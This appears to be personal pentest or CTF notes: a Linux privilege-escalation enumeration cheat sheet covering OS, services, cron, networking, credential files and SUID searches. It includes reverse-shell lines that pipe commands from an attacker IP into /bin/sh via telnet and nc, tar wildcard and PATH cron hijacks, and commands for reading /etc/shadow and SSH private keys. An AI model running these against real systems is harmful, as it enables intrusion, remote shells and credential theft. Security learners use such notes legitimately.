# Manual Enumeration:

## OS Information

1. Get distribution version:
    
    ```bash
    cat /etc/issue
    cat /etc/*-release
    	cat /etc/lsb-release
    	cat /etc/redhat-release
    ```
    
    ```bash
    
    ```
    
2. Get kernel information:
    
    ```bash
    cat /proc/version
    uname -a
    uname -mrs
    rpm -q kernel
    dmesg | grep Linux
    ls /boot | grep vmlinuz-
    ```
    
    ```bash
    
    ```
    
3. Get environment variable information:
    
    ```bash
    cat /etc/profile
    cat /etc/bashrc
    cat ~/.bash_profile
    cat ~/.bashrc
    cat ~/.bash_logout
    env
    set
    ```
    

```bash

```

1. Get printer information:
    
    ```bash
    lpstat -a
    ```
    
    ```bash
    
    ```
    

## Applications and Services

1. Get service information:
    
    ```bash
    ps aux
    ps -ef
    top
    cat /etc/services
    ```
    
    ```bash
    
    ```
    
2. What applications are installed?
    
    ```bash
    ls -alh /usr/bin/
    ls -alh /sbin/
    dpkg -l
    rpm -qa
    ls -alh /var/cache/apt/archivesO
    ls -alh /var/cache/yum/
    pspy4
    ```
    
    ```bash
    
    ```
    
3. Are services misconfigured?
    
    ```bash
    cat /etc/syslog.conf
    cat /etc/chttp.conf
    cat /etc/lighttpd.conf
    cat /etc/cups/cupsd.conf
    cat /etc/inetd.conf
    cat /etc/apache2/apache2.conf
    cat /etc/my.conf
    cat /etc/httpd/conf/httpd.conf
    cat /opt/lampp/etc/httpd.conf
    ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
    ```
    
    ```bash
    
    ```
    
4. Get cron information:
    
    ```bash
    crontab -l
    ls -alh /var/spool/cron
    ls -al /etc/ | grep cron
    ls -al /etc/cron*
    cat /etc/cron*
    cat /etc/at.allow
    cat /etc/at.deny
    cat /etc/cron.allow
    cat /etc/cron.deny
    cat /etc/crontab
    cat /etc/anacrontab
    cat /var/spool/cron/crontabs/root
    ls -al /var/cron.log - check timestamps 
    
    # If cron entries have relative paths, and If path is editable by user, cron entries can be hijacked by adding custom path to PATH variable
    export PATH=/tmp:$PATH
    
    # If Cron entris have wildcards, eg. tar with a (*)wildcard can be hijacked by using below on the folder 
    touch /home/user/--checkpoint=1
    touch /home/user/--checkpoint-action=exec=sh\ runme.sh
    
    # Check permissions on cron binaries , overwrite possible? 
    
    # Check for frequent CRONS running in bg 
    # You can monitor the processes to search for processes that are being executed every 1,2 or 5 minutes. Maybe you can take advantage of it and escalate privileges. 
    # For example, to monitor every 0.1s during 1 minute, sort by less executed commands and deleting the commands that have beeing executed all the time, you can do:
    for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
    # https://github.com/DominicBreuker/pspy 
    
    SystemD timers
    systemctl list-timers -all
    # watch for recently executed timers
    ```
    
    ```bash
    
    ```
    
5. Look for passwords:
    
    ```bash
    grep -i user [filename]
    grep -i pass [filename]
    grep -C 5 "password" [filename]
    find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
    ```
    

```bash

```

## Networking

1. Get NIC information:
    
    ```bash
    /sbin/ifconfig -a
    cat /etc/network/interfaces
    cat /etc/sysconfig/network
    ```
    
    ```bash
    
    ```
    
2. Check network configurations:
    
    ```bash
    cat /etc/resolv.conf
    cat /etc/sysconfig/network
    cat /etc/networks
    iptables -L
    hostname
    dnsdomainname
    ```
    
    ```bash
    
    ```
    
3. What users and hosts are talking to the system?
    
    ```bash
    lsof -i
    lsof -i :80
    grep 80 /etc/services
    netstat -antup
    netstat -antpx
    netstat -tulpn
    chkconfig --list
    chkconfig --list | grep 3:on
    last
    w
    ```
    
    ```bash
    
    ```
    
4. Get cached IP’s and MACs:
    
    ```bash
    **arp -e
    route
    /sbin/route -nee**
    ```
    
    ```bash
    
    ```
    
5. Run packet sniffing:
    
    ```bash
    tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
    ```
    
    ```bash
    
    ```
    
6. Can we get a shell?
    
    ```bash
    nc -lvp 4444    # Attacker. Input (Commands)
    nc -lvp 4445    # Attacker. Ouput (Results)
    telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
    ```
    
    ```bash
    
    ```
    
7. Try to port forward:
    
    ```bash
    ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
    ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
    
    mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay
    mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
    mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
    ```
    
    ```bash
    
    ```
    
8. Try to tunnel the connection to our Attack box:
    
    ```bash
    ssh -D 127.0.0.1:9050 -N [username]@[ip]
    proxychains ifconfig
    ```
    

```bash

```

## Confidential Information & Users

1. Get user information:
    
    ```bash
    id
    who
    w
    last
    cat /etc/passwd | cut -d: -f1    # List of users
    grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
    awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
    cat /etc/sudoers
    sudo -l
    ```
    
    ```bash
    
    ```
    
2. Check for sensitive files:
    
    ```bash
    cat /etc/passwd
    cat /etc/group
    cat /etc/shadow
    ls -alh /var/mail/
    ```
    
    ```bash
    
    ```
    
3. Check home directories:
    
    ```bash
    ls -ahlR /root/
    ls -ahlR /home/
    ```
    
    ```bash
    
    ```
    
4. Check configuration files, log files. Default paths for passwords:
    
    ```bash
    cat /var/apache2/config.inc
    cat /var/lib/mysql/mysql/user.MYD
    cat /root/anaconda-ks.cfg
    ```
    
    ```bash
    
    ```
    
5. Check history files for useful information:
    
    ```bash
    cat ~/.bash_history
    cat ~/.nano_history
    cat ~/.atftp_history
    cat ~/.mysql_history
    cat ~/.php_history
    ```
    
    ```bash
    
    ```
    
6. Check user information:
    
    ```bash
    cat ~/.bashrc
    cat ~/.profile
    cat /var/mail/root
    cat /var/spool/mail/root
    ```
    
    ```bash
    
    ```
    
7. Look for private keys:
    
    ```bash
    cat ~/.ssh/authorized_keys
    cat ~/.ssh/identity.pub
    cat ~/.ssh/identity
    cat ~/.ssh/id_rsa.pub
    cat ~/.ssh/id_rsa
    cat ~/.ssh/id_dsa.pub
    cat ~/.ssh/id_dsa
    cat /etc/ssh/ssh_config
    cat /etc/ssh/sshd_config
    cat /etc/ssh/ssh_host_dsa_key.pub
    cat /etc/ssh/ssh_host_dsa_key
    cat /etc/ssh/ssh_host_rsa_key.pub
    cat /etc/ssh/ssh_host_rsa_key
    cat /etc/ssh/ssh_host_key.pub
    cat /etc/ssh/ssh_host_key
    ```
    

```bash

```

# File Systems

1. Check for configuration files that can be written to. Check if services can be reconfigured:
    
    ```bash
    ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
    ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
    ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
    ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
    
    find /etc/ -readable -type f 2>/dev/null               # Anyone
    find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
    ```
    
    ```bash
    
    ```
    
2. Check for information in /var/:
    
    ```bash
    ls -alh /var/log
    ls -alh /var/mail
    ls -alh /var/spool
    ls -alh /var/spool/lpd
    ls -alh /var/lib/pgsql
    ls -alh /var/lib/mysql
    cat /var/lib/dhcp3/dhclient.leases
    ```
    
    ```bash
    
    ```
    
3. Check website files. Look for settings and database info:
    
    ```bash
    ls -alhR /var/www/
    ls -alhR /srv/www/htdocs/
    ls -alhR /usr/local/www/apache22/data/
    ls -alhR /opt/lampp/htdocs/
    ls -alhR /var/www/html/
    ```
    
    ```bash
    
    ```
    
4. Check log files: Local File Inclusion
    
    ```bash
    cat /etc/httpd/logs/access_log
    cat /etc/httpd/logs/access.log
    cat /etc/httpd/logs/error_log
    cat /etc/httpd/logs/error.log
    cat /var/log/apache2/access_log
    cat /var/log/apache2/access.log
    cat /var/log/apache2/error_log
    cat /var/log/apache2/error.log
    cat /var/log/apache/access_log
    cat /var/log/apache/access.log
    cat /var/log/auth.log
    cat /var/log/chttp.log
    cat /var/log/cups/error_log
    cat /var/log/dpkg.log
    cat /var/log/faillog
    cat /var/log/httpd/access_log
    cat /var/log/httpd/access.log
    cat /var/log/httpd/error_log
    cat /var/log/httpd/error.log
    cat /var/log/lastlog
    cat /var/log/lighttpd/access.log
    cat /var/log/lighttpd/error.log
    cat /var/log/lighttpd/lighttpd.access.log
    cat /var/log/lighttpd/lighttpd.error.log
    cat /var/log/messages
    cat /var/log/secure
    cat /var/log/syslog
    cat /var/log/wtmp
    cat /var/log/xferlog
    cat /var/log/yum.log
    cat /var/run/utmp
    cat /var/webmin/miniserv.log
    cat /var/www/logs/access_log
    cat /var/www/logs/access.log
    ls -alh /var/lib/dhcp3/
    ls -alh /var/log/postgresql/
    ls -alh /var/log/proftpd/
    ls -alh /var/log/samba/
    
    Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
    ```
    
    ```bash
    
    ```
    
5. Can you break out of a restricted shell?
    
    ```bash
    python -c 'import pty;pty.spawn("/bin/bash")'
    echo os.system('/bin/bash')
    /bin/sh -i
    ```
    
    ```bash
    $ python -c 'import pty;pty.spawn("/bin/bash")'
    /bin/sh: 26: python: not found
    $ echo os.system('/bin/bash')
    /bin/sh: 27: Syntax error: "(" unexpected
    $ /bin/sh -i
    /bin/sh: 0: can't access tty; job control turned off
    ```
    
6. Check for mounted file-systems:
    
    ```bash
    mount
    df -h
    ```
    
    ```bash
    $ df -h
    Filesystem      Size  Used Avail Use% Mounted on
    /dev/sda1       9.8G  2.5G  6.9G  27% /
    udev            472M     0  472M   0% /dev
    tmpfs           493M     0  493M   0% /dev/shm
    tmpfs            99M  692K   98M   1% /run
    tmpfs           5.0M     0  5.0M   0% /run/lock
    tmpfs           493M     0  493M   0% /sys/fs/cgroup
    ```
    
7. Check for unmounted file systems:
    
    ```bash
    cat /etc/fstab
    ```
    
    ```bash
    $ df -h
    Filesystem      Size  Used Avail Use% Mounted on
    /dev/sda1       9.8G  2.5G  6.9G  27% /
    udev            472M     0  472M   0% /dev
    tmpfs           493M     0  493M   0% /dev/shm
    tmpfs            99M  692K   98M   1% /run
    tmpfs           5.0M     0  5.0M   0% /run/lock
    tmpfs           493M     0  493M   0% /sys/fs/cgroup
    $ cat /etc/fstab
    # /etc/fstab: static file system information.
    #
    # Use 'blkid' to print the universally unique identifier for a
    # device; this may be used with UUID= as a more robust way to name devices
    # that works even if disks are added and removed. See fstab(5).
    #
    # <file system> <mount point>   <type>  <options>       <dump>  <pass>
    # / was on /dev/sda1 during installation
    UUID=ac5a1807-317d-4294-8954-741d3c11dbac /               ext4    errors=remount-ro 0       1
    /swapfile                                 none            swap    sw              0       0
    ```
    
8. Sticky bits, GUID and SUID
    
    ```bash
    find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
    find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
    find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
    
    find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
    for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
    
    # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
    find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
    ```
    

1. Check writeable and executable directories in common places:
    
    ```bash
    find / -writable -type d 2>/dev/null      # world-writeable folders
    find / -perm -222 -type d 2>/dev/null     # world-writeable folders
    find / -perm -o w -type d 2>/dev/null     # world-writeable folders
    
    find / -perm -o x -type d 2>/dev/null     # world-executable folders
    
    find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
    ```
    

1. Check world-writeable and nobody files:
    
    ```bash
    find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
    find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
    ```
    

# Finding Exploit Code:

1. Check for development tools and languages:
    
    ```bash
    find / -name perl*
    find / -name python*
    find / -name gcc*
    find / -name cc
    ```
    

1. Can files be uploaded?
    
    ```bash
    find / -name wget
    find / -name nc*
    find / -name netcat*
    find / -name tftp*
    find / -name ftp
    ```
    

# Shell Upgrading:

**Spawn interactive shell and set environment:**

```bash
python -c 'import pty;pty.spawn("/bin/bash");'  
ctrl z  
echo $TERM  
stty -a  
stty raw -echo  
fg  

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH  
export TERM=xterm256-color  
export SHELL=bash  

stty rows \<> colums \<>
```

**Break out of restricted shell:**

```bash
perl -e 'exec "/bin/sh";'  
/bin/sh -i  
exec "/bin/sh";  
echo os.system('/bin/bash')  
/bin/sh -i  
ssh user@$ip nc $localip 4444 -e /bin/sh  
export TERM=linux
```

# Automated Scripts:

```bash
linPEAS.sh
LinEnum.sh
linuxprivchecker.py
unix-privesc-check
Mestaploit: multi/recon/local_exploit_suggester
```

To read cmd of process with pid
```
cat /proc/PID/cmdline
```
